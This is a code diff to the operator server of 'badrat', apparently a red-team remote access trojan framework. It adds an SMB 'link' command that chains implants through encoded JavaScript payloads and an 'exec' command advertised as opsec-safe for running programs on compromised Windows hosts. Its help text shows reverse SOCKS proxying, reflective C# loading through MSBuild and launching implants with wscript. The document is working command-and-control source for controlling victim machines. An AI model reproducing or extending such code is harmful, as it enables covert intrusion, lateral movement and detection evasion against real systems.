@@ -60,12 +60,13 @@ hostnames = {}
 ip_addrs = {}
 notes = {}
 upstream = {}
+links = {}
 
 
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "runextra"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "link", "exec"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -128,9 +129,6 @@ class Completer(object):
         return self._complete_path(args[0])
 
     def complete_eval(self, args):
-        return self._complete_path(args[0])
-
-    def complete_runextra(self, args):
         return self._complete_path(args[0])
 
     def complete_remove(self, args):
@@ -303,6 +301,28 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
 
     fd.close()
     return(ratcode)
+
+def link_smb(ratID, filepath): # returns eval data for rat and registers link dict
+    if(types[ratID] == "ps1" or types[ratID] == "c#"):
+        pretty_print("[!] Runextra is not supported for PS1 or C# rats")
+        return
+
+    if("None" in links[ratID]):
+        links[ratID].remove('None')
+    links[ratID].append(filepath)
+
+    with open(os.getcwd() + "/resources/smb_link.js", "r") as fd:
+        smb_link_data = fd.read()
+    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
+        run_extra_data = fd.read()
+    
+    smb_link_data = smb_link_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\"))
+    smb_link_data = base64.b64encode(smb_link_data.encode('utf-8')).decode('utf-8')
+
+    run_extra_data = run_extra_data.replace("~~EXTRAB64~~", smb_link_data)
+
+    pretty_print("[*] Linking " + colors(ratID) + " to peer rat over SMB file path: " + filepath)
+    return "ev " + base64.b64encode(run_extra_data.encode('utf-8')).decode('utf-8')
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
@@ -510,8 +530,9 @@ def serve_server(port=8080):
                 if(ratType not in supported_types):
                     ratType = "?"
             except:
-                pretty_print("\n[!] Failed to grab id, type, username, or hostname param from package")
-                return(default_page())
+                if(verbose):
+                    pretty_print("\n[!] Failed to grab id, type, username, or hostname param from package " + str(package))
+                continue
     
             # Update checkin time for an agent every checkin
             checkin = datetime.now().strftime("%H:%M:%S")
@@ -524,6 +545,7 @@ def serve_server(port=8080):
             # Register new rat checkin
             if(ratID not in commands):
                 commands[ratID] = ""
+                links[ratID] = ["None"]
                 comp.add_tab_item(ratID)
                 pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
                 if(ratID == str(packages[-1]['id'])): # if the ratID is the same as the ratID in the last (or only package) then it is a directly connected rat
@@ -548,6 +570,9 @@ def serve_server(port=8080):
             cmnd = commands[ratID]
             commands[ratID] = ""
             return_dict['p'].append({"id": ratID, "cmnd": cmnd})
+
+        if(not return_dict['p']): # if no packages in return_dict, return default page
+            return(default_page())
 
         if(verbose):
             pretty_print("[v] Server sends data to rat " + colors(ratID) + ": " + json.dumps(return_dict))
@@ -600,13 +625,13 @@ def get_stagers(lhost):
     pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format("implant id","type","check-in","upstream","username","ip address","hostname"))
-    pretty_print("    ----------\t----\t--------   --------     --------               \t----------     \t--------")
+    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<6}".format("implant id","type","check-in","upstream","username","ip address","hostname","links"))
+    pretty_print("    ----------\t----\t--------   --------     --------               \t----------     \t--------\t-----")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         else:
-            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}   {:<20}\t{:<15}\t{:<15}\t{:<6}".format(ratID, colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         if(ratID in notes.keys() and notes[ratID] != ""):
             pretty_print("      L..:>> " + notes[ratID])
     pretty_print("")
@@ -646,8 +671,12 @@ def get_help():
     pretty_print("")
     pretty_print("Rat commands: -- commands to interact with a badrat rat")
     pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
+    pretty_print("exec -- Used to execute programs without running cmd.exe, but does not return output. More Opsec safe, runs in background, does not block")
+    pretty_print("example: exec wscript C:\\users\\username\\badrat.smb.js")
     pretty_print("quit -- when interacting with a rat, type quit to task the rat to shut down")
-    pretty_print("spawn -- used to spawn a new rat in a new process.")
+    pretty_print("spawn -- used to spawn a new rat in a new process. (doesn't work with SMB rats, don't even try...)")
+    pretty_print("link -- tells the current rat to link to a child rat given a local file or UNC path")
+    pretty_print("example: link \\\\Server01\\Public\\link.txt")
     pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
@@ -795,6 +824,9 @@ if __name__ == "__main__":
                             if(types[ratID] == "ps1" or types[ratID] == "hta"):
                                 inp = "spawn " + send_ratcode(ratID)
 
+                        elif(str.startswith(inp, "exec ")):
+                            inp = "ex " + base64.b64encode(" ".join(inp.split(" ")[1:]).encode('utf-8')).decode('utf-8')
+
                         elif(str.startswith(inp, "psh ")):
                             try:
                                 filepath = inp.split(" ")[1]
@@ -836,20 +868,9 @@ if __name__ == "__main__":
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 continue
 
-                        elif(str.startswith(inp, "runextra ")):
-                            try:
-                                filepath = inp.split(" ")[1]
-                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
-                                    pretty_print("[!] Runextra is not supported for PS1 or C# rats")
-                                    continue
-                                else:
-                                    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
-                                        run_extra_data = fd.read()
-                                    inp = "ev " + base64.b64encode(run_extra_data.replace("~~EXTRAB64~~", encode_file(filepath)).encode('utf-8')).decode('utf-8')
-                            except Exception as e:
-                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
-                                pretty_print(str(e))
-                                continue
+                        elif(str.startswith(inp, "link ")):
+                            filepath = inp.split(" ")[1]
+                            inp = link_smb(ratID, filepath)
 
                         elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                             try:
